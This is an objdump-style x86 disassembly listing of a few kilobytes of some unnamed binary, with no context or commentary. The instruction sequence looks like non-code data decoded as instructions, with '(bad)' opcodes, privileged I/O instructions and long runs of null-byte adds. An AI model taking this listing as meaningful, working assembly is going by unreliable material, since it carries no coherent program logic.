  44b5af:	xchg   esp,eax
  44b5b0:	imul   ebp,DWORD PTR [edi-0x6ba55ad7],0xfdc1a4b9
  44b5ba:	jns    0x44b62a
  44b5bc:	js     0x44b62d
  44b5be:	adc    ch,BYTE PTR [esi-0xca5ead3]
  44b5c4:	jmp    0x84c95fcb
  44b5c9:	dec    edx
  44b5ca:	sub    dh,BYTE PTR [edi+0x1edd614b]
  44b5d0:	mov    al,ds:0xc7507acb
  44b5d5:	xor    al,0x30
  44b5d7:	cwde   
  44b5d8:	pop    ecx
  44b5d9:	fild   QWORD PTR [ebx+0x5120afea]
  44b5df:	push   esp
  44b5e0:	nop
  44b5e1:	and    eax,0x2359a8d8
  44b5e6:	ss jbe 0x44b56d
  44b5e9:	or     al,0xf2
  44b5eb:	mov    ah,0x7b
  44b5ed:	fwait
  44b5ee:	xchg   BYTE PTR [esi],dh
  44b5f0:	cli    
  44b5f1:	retf   0x47a5
  44b5f4:	mov    edx,0x9f8bfd76
  44b5f9:	ss pushf 
  44b5fb:	fcmove st,st(7)
  44b5fd:	add    eax,0xe4e2790
  44b602:	cmp    ah,BYTE PTR [ecx-0x2f1a0ccf]
  44b608:	outs   dx,BYTE PTR ds:[esi]
  44b609:	xchg   edx,ebx
  44b60b:	xor    bh,BYTE PTR [ecx]
  44b60d:	into   
  44b60e:	sub    DWORD PTR [esi-0x58921e1c],esp
  44b614:	cdq    
  44b615:	sti    
  44b616:	imul   eax,DWORD PTR [ebx],0xa514e0ec
  44b61c:	mov    bl,0xd9
  44b61e:	out    dx,eax
  44b61f:	mov    ds:0xb5dc1d38,al
  44b624:	outs   dx,DWORD PTR ds:[esi]
  44b625:	enter  0x4d1e,0xf3
  44b629:	jecxz  0x44b69f
  44b62b:	or     eax,DWORD PTR [esi]
  44b62d:	gs sbb al,0x4b
  44b630:	push   ebp
  44b631:	add    al,0xe8
  44b633:	mov    dl,0x40
  44b635:	enter  0x3db1,0x82
  44b639:	adc    BYTE PTR [edx-0x1362c45],0xab
  44b640:	sub    ebx,edi
  44b642:	imul   ebp,DWORD PTR ss:[edx-0x554872e1],0x1
  44b64a:	pop    esp
  44b64b:	scas   eax,DWORD PTR es:[edi]
  44b64c:	sub    esp,ecx
  44b64e:	sub    ah,0x4a
  44b651:	mov    BYTE PTR [esi+0x5b],al
  44b654:	push   ss
  44b655:	sub    edx,ebx
  44b657:	sti    
  44b658:	pop    edx
  44b659:	dec    ebp
  44b65a:	outs   dx,BYTE PTR ds:[esi]
  44b65b:	scas   al,BYTE PTR es:[edi]
  44b65c:	mov    ebp,0xf9126bb3
  44b661:	mov    dl,BYTE PTR [edi]
  44b663:	das    
  44b664:	sub    al,0x19
  44b666:	pop    edx
  44b667:	mov    bh,0x3b
  44b669:	or     bl,bl
  44b66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b66c:	cmp    DWORD PTR [edi-0x42],ebx
  44b66f:	mov    ds:0x61965912,eax
  44b674:	mov    dl,0x9
  44b676:	jae    0x44b69c
  44b678:	jo     0x44b688
  44b67a:	mov    cl,0x6d
  44b67c:	cmp    esp,DWORD PTR [ebx]
  44b67e:	rcr    BYTE PTR [ebx+0x62],1
  44b681:	sbb    DWORD PTR [ecx+0x1f],ebx
  44b684:	retf   0x450a
  44b687:	mov    ch,0xd6
  44b689:	test   BYTE PTR [edi+0x190bc31f],bl
  44b68f:	arpl   WORD PTR [esi-0x1a0936a2],si
  44b695:	xchg   ebx,eax
  44b696:	mov    DWORD PTR [ebp-0x3f826cc1],ebx
  44b69c:	cmp    esp,ecx
  44b69e:	or     BYTE PTR [ecx],0x33
  44b6a1:	jecxz  0x44b693
  44b6a3:	out    0xda,eax
  44b6a5:	mov    ebx,0x784d9f8c
  44b6aa:	sahf   
  44b6ab:	push   edx
  44b6ac:	jno    0x44b6a6
  44b6ae:	shl    DWORD PTR [esi-0x4f],1
  44b6b1:	ror    DWORD PTR [edi-0x5a],0x42
  44b6b5:	fcmovnb st,st(0)
  44b6b7:	push   ebx
  44b6b8:	dec    edx
  44b6b9:	dec    ebx
  44b6ba:	retf   0x4494
  44b6bd:	dec    eax
  44b6be:	test   BYTE PTR [edi-0x50a1364f],al
  44b6c4:	cmp    eax,DWORD PTR [eax+0x7a]
  44b6c7:	pop    esp
  44b6c8:	scas   al,BYTE PTR es:[edi]
  44b6c9:	scas   eax,DWORD PTR es:[edi]
  44b6ca:	nop
  44b6cb:	imul   edi,DWORD PTR [ecx+edi*8-0x79cc542a],0x2
  44b6d3:	test   edx,esp
  44b6d5:	lahf   
  44b6d6:	gs jbe 0x44b665
  44b6d9:	push   ecx
  44b6da:	ret    0xdedd
  44b6dd:	add    eax,esi
  44b6df:	std    
  44b6e0:	inc    edx
  44b6e1:	xchg   edi,eax
  44b6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b6e3:	cmp    BYTE PTR [edx],0x36
  44b6e6:	jb     0x44b689
  44b6e8:	cmp    ebx,DWORD PTR [ebp-0x6e]
  44b6eb:	loop   0x44b717
  44b6ed:	inc    ebp
  44b6ee:	test   BYTE PTR [ebx+0x224ddc4d],dh
  44b6f4:	test   eax,0x84994bae
  44b6f9:	inc    eax
  44b6fa:	add    ebp,edi
  44b6fc:	pop    ecx
  44b6fd:	pusha  
  44b6fe:	mov    edx,0x54cb3273
  44b703:	lock dec ebp
  44b705:	sbb    dl,BYTE PTR [ecx]
  44b707:	popa   
  44b708:	mov    cl,0x51
  44b70a:	(bad)  
  44b70b:	clc    
  44b70c:	jmp    0x44b75e
  44b70e:	(bad)  
  44b70f:	je     0x44b763
  44b711:	mov    ?,ecx
  44b713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b714:	dec    edx
  44b715:	stos   DWORD PTR es:[edi],eax
  44b716:	dec    esi
  44b717:	mov    eax,ds:0xdd4c8072
  44b71c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b71d:	and    DWORD PTR [edx-0x54],ebx
  44b720:	mov    esi,0xdf9ffa17
  44b725:	mov    bl,0xcd
  44b727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b728:	jmp    0x44b6e0
  44b72a:	add    BYTE PTR [eax],al
  44b72c:	and    BYTE PTR [eax+eax*1],ah
  44b72f:	add    al,0xb0
  44b731:	add    BYTE PTR [eax],cl
  44b733:	je     0x44b6e7
  44b735:	or     ecx,0x10084192
  44b73b:	add    DWORD PTR [ecx+0x9],0x0
  44b73f:	push   ss
  44b740:	inc    eax
  44b741:	or     BYTE PTR [edx-0x6ede53bc],al
  44b747:	adc    BYTE PTR [eax+ecx*2],cl
  44b74a:	adc    BYTE PTR [eax],al
  44b74c:	add    BYTE PTR [eax+0x40148],ah
  44b752:	add    BYTE PTR [eax+0x2401000],0x0
  44b759:	add    BYTE PTR [eax],cl
  44b75b:	sub    BYTE PTR [eax+eax*1+0x1400009],dh
  44b762:	add    al,BYTE PTR [eax]
  44b764:	aaa    
  44b765:	mov    BYTE PTR [edx],al
  44b767:	xchg   esi,eax
  44b768:	add    BYTE PTR [eax],al
  44b76a:	add    BYTE PTR [eax],al
  44b76c:	adc    BYTE PTR [ebx],dl
  44b76e:	add    BYTE PTR [ecx+ecx*4+0x18],dh
  44b772:	mov    ah,BYTE PTR [esi]
  44b774:	adc    BYTE PTR [edx+0x4],bh
  44b777:	inc    eax
  44b778:	sbb    BYTE PTR [ebx],al
  44b77a:	add    cl,dh
  44b77c:	add    al,BYTE PTR [eax+0x0]
  44b77f:	or     BYTE PTR ss:[eax],dl
  44b782:	stos   BYTE PTR es:[edi],al
  44b783:	add    al,0x40
  44b785:	es pop es
  44b787:	mov    ch,0x0
  44b789:	add    cl,BYTE PTR [eax]
  44b78b:	add    BYTE PTR [esi],cl
  44b78d:	add    BYTE PTR [edx+ecx*1],al
  44b790:	add    eax,0x3280410
  44b795:	add    BYTE PTR [eax+0x30b10070],ah
  44b79b:	pop    es
  44b79c:	add    BYTE PTR [edx+0x1000400],dl
  44b7a2:	test   BYTE PTR [eax+0x50004000],al
  44b7a8:	dec    eax
  44b7a9:	or     ecx,DWORD PTR [eax]
  44b7ab:	xchg   edi,eax
  44b7ac:	add    BYTE PTR [eax+0x0],dl
  44b7af:	adc    ch,BYTE PTR ds:0x33800048
  44b7b5:	add    BYTE PTR [eax],ah
  44b7b7:	add    BYTE PTR [eax],ch
  44b7b9:	inc    edx
  44b7ba:	or     BYTE PTR [eax+ecx*2],al
  44b7bd:	and    BYTE PTR [eax+0x30000441],ah
  44b7c3:	push   esp
  44b7c4:	mov    ah,BYTE PTR [ecx]
  44b7c6:	add    BYTE PTR [edx],al
  44b7c8:	or     DWORD PTR [eax],eax
  44b7ca:	and    DWORD PTR [eax],eax
  44b7cc:	sub    BYTE PTR [edx-0x4a],bl
  44b7cf:	inc    ecx
  44b7d0:	add    BYTE PTR [eax+0x1020808],0x17
  44b7d7:	adc    esp,DWORD PTR [eax]
  44b7d9:	or     BYTE PTR [eax],dl
  44b7db:	add    BYTE PTR [eax],al
  44b7dd:	add    BYTE PTR [eax+0x4],al
  44b7e0:	or     BYTE PTR [eax+0x10],0x80
  44b7e4:	test   BYTE PTR [edx],al
  44b7e6:	add    al,0x80
  44b7e8:	push   ecx
  44b7e9:	adc    BYTE PTR [eax],al
  44b7eb:	push   0x41110080
  44b7f0:	add    BYTE PTR [eax-0x7f],al
  44b7f3:	adc    al,0x30
  44b7f5:	mov    al,ds:0x29402406
  44b7fa:	add    BYTE PTR [edx+0x0],dh
  44b7fd:	or     BYTE PTR [ecx],al
  44b7ff:	add    al,BYTE PTR [eax+0x4020]
  44b805:	rol    BYTE PTR [ecx+eax*4],1
  44b808:	mov    al,ds:0x44300400
  44b80d:	inc    ecx
  44b80e:	and    DWORD PTR [ecx+0x4],eax
  44b811:	push   ecx
  44b812:	inc    esp
  44b813:	test   al,0x1e
  44b815:	adc    al,BYTE PTR [eax]
  44b817:	add    ch,BYTE PTR [eax]
  44b819:	or     dl,BYTE PTR [ecx+edx*1+0x28d402c1]
  44b820:	or     cl,al
  44b822:	add    edx,DWORD PTR [edx]
  44b824:	add    BYTE PTR [eax],bl
  44b826:	adc    al,al
  44b828:	loopne 0x44b7ac
  44b82a:	add    DWORD PTR [eax],eax
  44b82c:	sub    BYTE PTR [ecx+0x55],dh
  44b82f:	inc    ebp
  44b830:	adc    DWORD PTR [eax+0x480d8b4],esi
  44b836:	adc    BYTE PTR [eax],ah
  44b838:	sbb    BYTE PTR [ecx],dh
  44b83a:	and    BYTE PTR [edx+0x60],cl
  44b83d:	and    BYTE PTR [eax],al
  44b83f:	mov    eax,DWORD PTR [eax]
  44b841:	enter  0x9108,0x9
  44b845:	add    BYTE PTR [ecx],al
  44b847:	or     DWORD PTR [eax],eax
  44b849:	add    BYTE PTR [eax+0x8],al
  44b84c:	or     cl,BYTE PTR [eax+ebp*1]
  44b84f:	add    al,BYTE PTR es:[eax]
  44b852:	add    ah,BYTE PTR [eax]
  44b854:	adc    BYTE PTR [eax+ebx*2+0x6020100],cl
  44b85b:	inc    eax
  44b85c:	add    BYTE PTR [esp+ecx*1],al
  44b85f:	pop    es
  44b860:	add    BYTE PTR [edx+eax*1+0x40341c00],al
  44b867:	add    BYTE PTR [ebx],al
  44b869:	add    bl,cl
  44b86b:	add    BYTE PTR [eax],0x1
  44b86e:	add    BYTE PTR [ecx],dh
  44b870:	add    al,0x0
  44b872:	pop    edx
  44b873:	rol    BYTE PTR ds:[eax],0x10
  44b877:	mov    eax,ds:0x106bc218
  44b87c:	dec    ecx
  44b87d:	add    al,0x20
  44b87f:	inc    eax
  44b880:	sbb    BYTE PTR [ecx],cl
  44b882:	mov    eax,DWORD PTR [eax-0x5fdfdc00]
  44b888:	bound  eax,QWORD PTR [ecx+eax*1]
  44b88b:	add    cl,BYTE PTR [eax+0x4280c8a8]
  44b891:	or     BYTE PTR [edx],dh
  44b893:	inc    edi
  44b894:	popa   
  44b895:	adc    ah,dh
  44b897:	inc    eax
  44b898:	and    BYTE PTR [ecx],0x0
  44b89b:	adc    ch,0x40
  44b89e:	add    dl,al
  44b8a0:	add    al,0x44
  44b8a2:	shl    cl,1
  44b8a4:	or     BYTE PTR [edx],al
  44b8a6:	add    al,0x24
  44b8a8:	fmul   DWORD PTR [ecx+0x10]
  44b8ab:	add    BYTE PTR [eax],al
  44b8ad:	add    al,0x5
  44b8af:	or     DWORD PTR ds:0x4a08428,eax
  44b8b5:	add    BYTE PTR [eax],al
  44b8b7:	add    al,BYTE PTR [edx]
  44b8b9:	add    BYTE PTR [eax+eiz*1],al
  44b8bc:	add    al,BYTE PTR [eax]
  44b8be:	add    BYTE PTR [ecx],0x8
  44b8c1:	adc    BYTE PTR [eax],al
  44b8c3:	inc    edx
  44b8c4:	sub    al,0x12
  44b8c6:	add    al,BYTE PTR [ebx]
  44b8c8:	xor    BYTE PTR [ecx+0x64037a2],0x21
  44b8cf:	dec    eax
  44b8d0:	or     BYTE PTR [ebx],al
  44b8d2:	add    BYTE PTR [eax-0x80],0x8a
  44b8d6:	add    BYTE PTR ds:0x9413983,al
  44b8dc:	mov    eax,ds:0x89c01010
  44b8e1:	inc    edx
  44b8e2:	add    BYTE PTR ds:0x81001240,al
  44b8e8:	push   ecx
  44b8e9:	add    BYTE PTR [esi+eax*4],al
  44b8ec:	add    BYTE PTR [eax],ah
  44b8ee:	and    BYTE PTR [eax],ah
  44b8f0:	add    al,BYTE PTR [eax+eax*1]
  44b8f3:	test   BYTE PTR [eax],al
  44b8f5:	push   es
  44b8f6:	add    DWORD PTR [eax],eax
  44b8f8:	test   eax,0x3901040
  44b8fd:	dec    eax
  44b8fe:	add    BYTE PTR [eax],al
  44b900:	add    BYTE PTR es:[edx-0x70],0xcd
  44b905:	inc    eax
  44b906:	sbb    BYTE PTR [eax+0x43800063],al
  44b90c:	add    BYTE PTR [eax+0x58040280],al
  44b912:	inc    eax
  44b913:	and    BYTE PTR [eax],al
  44b915:	or     al,0x32
  44b917:	xchg   ecx,eax
  44b918:	or     BYTE PTR [eax],ah
  44b91a:	or     DWORD PTR [eax],edx
  44b91c:	or     BYTE PTR [eax],dh
  44b91e:	push   edx
  44b91f:	push   eax
  44b920:	and    al,0x4
  44b922:	xor    cl,BYTE PTR [eax]
  44b924:	add    BYTE PTR [ecx+0x0],cl
  44b927:	add    BYTE PTR [ebp+0x7],ah
  44b92a:	adc    BYTE PTR [ebx],al
  44b92c:	push   eax
  44b92d:	add    BYTE PTR [ecx+0x180240],al
  44b933:	dec    eax
  44b934:	add    al,BYTE PTR [eax]
  44b936:	inc    ebx
  44b937:	add    DWORD PTR [eax+0x4a8600e2],eax
  44b93d:	mov    al,0x2
  44b93f:	xor    BYTE PTR [eax],dh
  44b941:	add    ah,BYTE PTR [edx]
  44b943:	add    BYTE PTR [eax],ch
  44b945:	add    BYTE PTR [ebp+0x2f],al
  44b948:	add    BYTE PTR [eax],al
  44b94a:	pop    esp
  44b94b:	push   ecx
  44b94c:	add    BYTE PTR [eax],al
  44b94e:	and    BYTE PTR [eax],0x3
  44b951:	inc    esi
  44b952:	and    bl,BYTE PTR [eax]
  44b954:	add    DWORD PTR [edx],eax
  44b956:	data16 mov BYTE PTR [esi],ah
  44b959:	add    BYTE PTR [edi],al
  44b95b:	and    BYTE PTR [esi],al
  44b95d:	add    al,BYTE PTR [ecx]
  44b95f:	and    BYTE PTR [eax],bl
  44b961:	mov    dh,0x10
  44b963:	add    al,0x40
  44b965:	inc    eax
  44b966:	add    BYTE PTR [edx],al
  44b968:	add    al,0x20
  44b96a:	xchg   edx,eax
  44b96b:	inc    ecx
  44b96c:	mov    ds:0x1446084,al
  44b971:	or     al,BYTE PTR es:[eax]
  44b974:	inc    eax
  44b975:	or     BYTE PTR [edx],0x82
  44b978:	dec    edx
  44b979:	add    DWORD PTR [eax],esp
  44b97b:	add    DWORD PTR [eax],eax
  44b97d:	add    BYTE PTR [eax+0x10002898],ah
  44b983:	add    al,0x90
  44b985:	add    BYTE PTR [eax],al
  44b987:	(bad)  
  44b988:	or     BYTE PTR [eax],al
  44b98a:	adc    al,0x15
  44b98c:	cmp    eax,0x10000000
  44b991:	sbb    BYTE PTR [eax],0x0
  44b994:	or     BYTE PTR [eax],cl
  44b996:	inc    eax
  44b997:	or     al,0x2a
  44b999:	or     al,al
  44b99b:	add    dh,BYTE PTR [ecx+0x10]
  44b99e:	inc    edx
  44b99f:	add    eax,0x52104050
  44b9a4:	add    BYTE PTR ds:0x5c44001,al
  44b9aa:	lods   al,BYTE PTR ds:[esi]
  44b9ab:	add    BYTE PTR [eax],al
  44b9ad:	and    BYTE PTR [eax-0x7efeecb0],dl
  44b9b3:	les    edx,FWORD PTR [eax]
  44b9b5:	xor    al,0x0
  44b9b7:	pusha  
  44b9b8:	fiadd  DWORD PTR [edx]
  44b9ba:	inc    ebp
  44b9bb:	add    BYTE PTR [eax],bh
  44b9bd:	and    BYTE PTR [eax-0x78],dh
  44b9c0:	loopne 0x44b98b
  44b9c2:	mov    al,al
  44b9c4:	jo     0x44b9d7
  44b9c6:	inc    eax
  44b9c7:	cmp    BYTE PTR ds:0xa8,bl
  44b9cd:	push   ss
  44b9ce:	add    al,0x0
  44b9d0:	or     BYTE PTR [eax+0x4426012],0x80
  44b9d7:	add    BYTE PTR [ebx],dl
  44b9d9:	mov    ds:0xa80040c5,eax
  44b9de:	add    BYTE PTR [eax],0xc0
  44b9e1:	add    BYTE PTR [ecx+0x98e4],al
  44b9e7:	add    al,BYTE PTR [eax]
  44b9e9:	add    BYTE PTR ds:0x1100400,ch
  44b9ef:	inc    edx
  44b9f0:	test   al,0x88
  44b9f2:	and    BYTE PTR [eax],al
  44b9f4:	inc    edx
  44b9f5:	add    BYTE PTR [eax+0x52],cl
  44b9f8:	add    BYTE PTR [ecx],al
  44b9fa:	add    BYTE PTR [ecx+0x2000122],0x1
  44ba01:	add    BYTE PTR [eax+eax*2],al
  44ba04:	inc    ebx
  44ba05:	sub    ch,BYTE PTR [eax+0x20]
  44ba08:	push   0x4002a2
  44ba0d:	add    BYTE PTR [edx],al
  44ba0f:	add    BYTE PTR [eax+0x8251500],al
  44ba15:	and    BYTE PTR [eax],al
  44ba17:	adc    al,BYTE PTR [eax]
  44ba19:	test   BYTE PTR [edx],al
  44ba1b:	inc    eax
  44ba1c:	cwde   
  44ba1d:	pop    es
  44ba1e:	add    DWORD PTR [eax],eax
  44ba20:	and    BYTE PTR [esi],ch
  44ba22:	inc    ecx
  44ba23:	add    eax,eax
  44ba25:	adc    DWORD PTR [eax],eax
  44ba27:	sbb    eax,0x1400502a
  44ba2c:	sub    BYTE PTR [ecx+ebx*1],dl
  44ba2f:	mov    ds:0x302883d,eax
  44ba34:	add    DWORD PTR [eax],0x2502a8
  44ba3a:	add    al,0x6e
  44ba3c:	add    BYTE PTR [eax+ecx*1+0xa],0x0
  44ba41:	or     BYTE PTR [eax],cl
  44ba43:	add    BYTE PTR [eax],ah
  44ba45:	add    BYTE PTR [edx],0x40
  44ba48:	and    BYTE PTR [eax],dl
  44ba4a:	add    al,0xc0
  44ba4d:	jbe    0x44ba4f
  44ba4f:	add    BYTE PTR [eax+0x13],dl
  44ba52:	and    DWORD PTR [ebx],eax
  44ba54:	add    DWORD PTR [ebp+0x68],0xe18028
  44ba5b:	add    eax,DWORD PTR [edx]
  44ba5d:	sub    BYTE PTR [ecx],dl
  44ba5f:	add    BYTE PTR [edx],0x3
  44ba62:	pop    eax
  44ba63:	inc    eax
  44ba64:	add    al,BYTE PTR [eax]
  44ba66:	add    BYTE PTR [eax],al
  44ba68:	or     al,0xa0
  44ba6a:	add    BYTE PTR [eax+eax*1-0x7ff80000],al
  44ba71:	add    DWORD PTR [edx+0x1],eax
  44ba74:	mov    al,ds:0x2cb5c014
  44ba79:	xor    DWORD PTR [eax],edx
  44ba7b:	mov    BYTE PTR [eax+0x12],dh
  44ba7e:	test   BYTE PTR [eax],dh
  44ba80:	push   eax
  44ba81:	add    DWORD PTR [eax],edx
  44ba83:	and    DWORD PTR [ecx],esp
  44ba85:	or     ah,BYTE PTR [ebp+0x60044001]
  44ba8b:	inc    ebp
  44ba8c:	inc    eax
  44ba8d:	inc    eax
  44ba8e:	rol    BYTE PTR [ecx],0x10
  44ba91:	ror    BYTE PTR [eax],0x10
  44ba94:	lds    eax,FWORD PTR [eax]
  44ba96:	and    BYTE PTR [eax],bh
  44ba98:	adc    BYTE PTR [ecx],al
  44ba9a:	add    BYTE PTR [eax],al
  44ba9c:	add    BYTE PTR [eax+0x4014c060],al
  44baa2:	pusha  
  44baa3:	test   al,0xc9
  44baa5:	adc    BYTE PTR [edx],al
  44baa7:	pusha  
  44baa8:	and    al,dl
  44baaa:	add    BYTE PTR [eax],al
  44baac:	xor    DWORD PTR [eax],eax
  44baae:	or     BYTE PTR [ebp+0x1a1103c0],ah
  44bab4:	add    BYTE PTR [eax+eax*2],al
  44bab7:	add    al,0x94
  44bab9:	add    BYTE PTR [eax-0x74],dh
  44babc:	mov    dl,0x0
  44babe:	adc    BYTE PTR [eax],al
  44bac0:	or     DWORD PTR [ebx+0x10],esp
  44bac3:	rol    BYTE PTR [eax+0x8620302],0x1
  44baca:	loopne 0x44bad4
  44bacc:	inc    eax
  44bacd:	or     cl,BYTE PTR ds:0x30108800
  44bad3:	and    DWORD PTR [eax],ebx
  44bad5:	add    DWORD PTR [ecx+eax*1+0x10],eax
  44bad9:	add    cl,BYTE PTR [eax]
  44badb:	dec    ecx
  44badc:	inc    edx
  44badd:	add    BYTE PTR [eax+0x2],dl
  44bae0:	add    BYTE PTR [edx],al
  44bae2:	add    BYTE PTR [esi+eax*1],al
  44bae5:	add    BYTE PTR [eax],al
  44bae7:	pusha  
  44bae8:	sub    BYTE PTR [eax-0x7fffefc0],al
  44baee:	add    BYTE PTR [edx],dl
  44baf0:	add    BYTE PTR [ecx],al
  44baf2:	mov    BYTE PTR [edx],al
  44baf4:	add    dl,BYTE PTR [eax]
  44baf6:	jo     0x44bb48
  44baf8:	inc    eax
  44baf9:	or     dl,BYTE PTR [eax+0x5004400]
  44baff:	add    al,BYTE PTR [eax]
  44bb01:	add    BYTE PTR [eax],dl
  44bb03:	add    DWORD PTR [eax+edx*4],eax
  44bb06:	add    al,BYTE PTR [edx]
  44bb08:	add    BYTE PTR [eax+eiz*1+0x4000040],dl
  44bb0f:	add    dl,BYTE PTR [ecx+0x8]
  44bb12:	or     al,0x0
  44bb14:	add    BYTE PTR [eax],al
  44bb16:	add    eax,DWORD PTR [eax+0x6]
  44bb19:	inc    eax
  44bb1a:	mov    DWORD PTR [edx],eax
  44bb1c:	add    DWORD PTR [ecx],eax
  44bb1e:	add    DWORD PTR [eax],eax
  44bb20:	inc    ecx
  44bb21:	add    al,BYTE PTR [eax+0x0]
  44bb24:	es dec eax
  44bb26:	sbb    DWORD PTR [eax],edx
  44bb28:	or     dl,BYTE PTR [edx]
  44bb2a:	inc    eax
  44bb2b:	inc    esp
  44bb2c:	add    al,0x0
  44bb2e:	pop    edx
  44bb2f:	push   edx
  44bb30:	sbb    ch,BYTE PTR [edx]
  44bb32:	add    BYTE PTR [ecx],ah
  44bb34:	add    BYTE PTR [ecx+eax*2],al
  44bb37:	add    al,0x83
  44bb39:	and    esi,DWORD PTR [eax+0x68883a7]
  44bb3f:	add    BYTE PTR [edx],ch
  44bb41:	inc    eax
  44bb42:	adc    BYTE PTR [eax-0x7ffb7d80],al
  44bb48:	inc    eax
  44bb49:	xor    DWORD PTR [eax],ecx
  44bb4b:	pusha  
  44bb4c:	add    BYTE PTR [eax+0x801008a],dl
  44bb52:	adc    BYTE PTR [eax+0x5],bl
  44bb55:	add    DWORD PTR [eax+edx*1],eax
  44bb58:	rol    BYTE PTR [edx+0x60],0x55
  44bb5c:	add    DWORD PTR [eax],esp
  44bb5e:	adc    BYTE PTR [eax+ecx*2+0x0],0x0
  44bb63:	inc    eax
  44bb64:	mov    WORD PTR [eax],ss
  44bb66:	mov    BYTE PTR [eax+eax*1+0x10e41851],ah
  44bb6d:	pop    eax
  44bb6e:	or     BYTE PTR [eax+0x1000811],ah
  44bb74:	ret    0x114b
  44bb77:	inc    eax
  44bb78:	or     DWORD PTR [ecx],eax
  44bb7a:	shl    DWORD PTR [eax],0x88
  44bb7d:	add    BYTE PTR [eax+eax*1+0x5],bl
  44bb81:	push   ecx
  44bb82:	or     BYTE PTR [eax],al
  44bb84:	cwde   
  44bb85:	add    BYTE PTR [eax+eiz*1],cl
  44bb88:	add    BYTE PTR [eax],ah
  44bb8a:	adc    dl,BYTE PTR [eax+eax*1]
  44bb8d:	add    ah,ah
  44bb8f:	or     BYTE PTR [edx],al
  44bb91:	or     BYTE PTR [eax+0x6058006],0x40
  44bb98:	add    BYTE PTR [ecx+eax*2+0x201921],dl
  44bb9f:	add    cl,BYTE PTR [ecx]
  44bba1:	add    al,0x98
  44bba3:	inc    ecx
  44bba4:	pusha  
  44bba5:	sub    DWORD PTR [eax+0x6],ecx
  44bba8:	add    BYTE PTR [eax],al
  44bbaa:	mov    DWORD PTR [ecx-0x7e],esp
  44bbad:	data16 add BYTE PTR [edx],dh
  44bbb0:	add    BYTE PTR [eax],dl
  44bbb2:	dec    esp
  44bbb3:	xor    DWORD PTR [eax+0x34806100],eax
  44bbb9:	push   eax
  44bbba:	add    BYTE PTR [ebx],dl
  44bbbc:	add    BYTE PTR [eax],al
  44bbbe:	inc    eax
  44bbbf:	or     BYTE PTR [ecx+0x4],dl
  44bbc2:	or     DWORD PTR [edx+edx*2],edx
  44bbc5:	add    DWORD PTR [ecx],eax
  44bbc7:	inc    eax
  44bbc8:	xchg   edx,eax
  44bbc9:	adc    BYTE PTR [ecx+0x10],al
  44bbcc:	inc    eax
  44bbcd:	pop    es
  44bbce:	add    BYTE PTR [eax+0x4],al
  44bbd1:	add    al,al
  44bbd3:	add    BYTE PTR [eax+0x2061ac90],dl
  44bbd9:	add    BYTE PTR [ebx+0x8004800],dl
  44bbdf:	adc    BYTE PTR [eax],0x0
  44bbe2:	add    BYTE PTR [ebp+0x10],bl
  44bbe5:	inc    esi
  44bbe6:	add    BYTE PTR [eax],dl
  44bbe8:	add    BYTE PTR [eax-0x3dfff670],al
  44bbee:	add    BYTE PTR [eax],al
  44bbf0:	or     BYTE PTR [eax],ah
  44bbf2:	mov    dh,BYTE PTR [eax]
  44bbf4:	(bad)  
  44bbf5:	or     BYTE PTR [eax+eax*1],al
  44bbf8:	add    BYTE PTR [eax+0x40],ah
  44bbfb:	add    DWORD PTR [eax+eax*1],0x11000802
  44bc02:	jo     0x44bc05
  44bc04:	int    0x0
  44bc06:	and    eax,DWORD PTR [eax+0x401650]
  44bc0c:	rcr    BYTE PTR [eax+0x0],0x10
  44bc10:	inc    ebp
  44bc11:	mov    WORD PTR ds:0x30000,es
  44bc17:	adc    al,0x6
  44bc19:	and    BYTE PTR [eax],bl
  44bc1b:	or     BYTE PTR [eax],0x17
  44bc1e:	sub    DWORD PTR [eax+eiz*1],edx
  44bc21:	and    BYTE PTR [edx-0x60],dl
  44bc24:	add    BYTE PTR [edx+eax*1],ah
  44bc27:	nop
  44bc28:	add    BYTE PTR [eax+0x40002804],dl
  44bc2e:	inc    eax
  44bc2f:	and    BYTE PTR [ebx+0x2],0x84
  44bc33:	push   eax
  44bc34:	add    BYTE PTR [ebx+0x4f],cl
  44bc37:	and    BYTE PTR [eax],al
  44bc39:	inc    ecx
  44bc3a:	inc    eax
  44bc3b:	add    BYTE PTR [eax+0x1e],0x8b
  44bc3f:	xor    BYTE PTR [ecx],al
  44bc41:	add    BYTE PTR [eax+0xc85a08],ah
  44bc47:	add    BYTE PTR [eax],al
  44bc49:	test   DWORD PTR [eax],eax
  44bc4b:	or     BYTE PTR [eax],al
  44bc4d:	add    BYTE PTR [eax],al
  44bc4f:	dec    eax
  44bc50:	lock or BYTE PTR [eax+0x40],ah
  44bc54:	inc    eax
  44bc55:	adc    BYTE PTR [eax],dl
  44bc57:	add    BYTE PTR [ecx-0x7fe7fee3],al
  44bc5d:	add    al,0xcb
  44bc5f:	push   es
  44bc60:	or     DWORD PTR [eax],ecx
  44bc62:	es cwde 
  44bc64:	mov    al,ds:0xc0c25008
  44bc69:	loop   0x44bc73
  44bc6b:	add    DWORD PTR [eax],ebp
  44bc6d:	or     al,0x10
  44bc6f:	add    al,BYTE PTR [eax+0x4f]
  44bc72:	add    BYTE PTR [eax],al
  44bc74:	adc    esp,DWORD PTR [ecx]
  44bc76:	ror    BYTE PTR [edx+0xf48010],0xc
  44bc7d:	xor    BYTE PTR [eax],al
  44bc7f:	add    BYTE PTR [eax+0x48240740],0x62
  44bc86:	adc    bl,BYTE PTR [eax-0x1fd6fb80]
  44bc8c:	adc    BYTE PTR [edx],ah
  44bc8e:	sbb    cl,BYTE PTR [edx-0x7c]
  44bc91:	add    ah,BYTE PTR [ecx+0x8]
  44bc94:	inc    eax
  44bc95:	add    BYTE PTR ds:0x43d10070,al
  44bc9b:	add    BYTE PTR [eax],0x6e
  44bc9e:	inc    edx
  44bc9f:	inc    eax
  44bca0:	add    BYTE PTR [eax],dl
  44bca2:	add    cl,BYTE PTR [ecx+0x2]
  44bca5:	add    al,BYTE PTR [eax+0x4]
  44bca8:	add    BYTE PTR [eiz*1-0x77efe0e0],al
  44bcaf:	jo     0x44bc31
  44bcb1:	dec    ecx
  44bcb2:	adc    BYTE PTR [eax+0x4],bl
  44bcb5:	add    al,BYTE PTR [edx]
  44bcb7:	inc    eax
  44bcb8:	inc    eax
  44bcb9:	add    cl,al
  44bcbb:	dec    eax
  44bcbc:	or     DWORD PTR [esp+eax*2],ecx
  44bcbf:	or     DWORD PTR [eax],edx
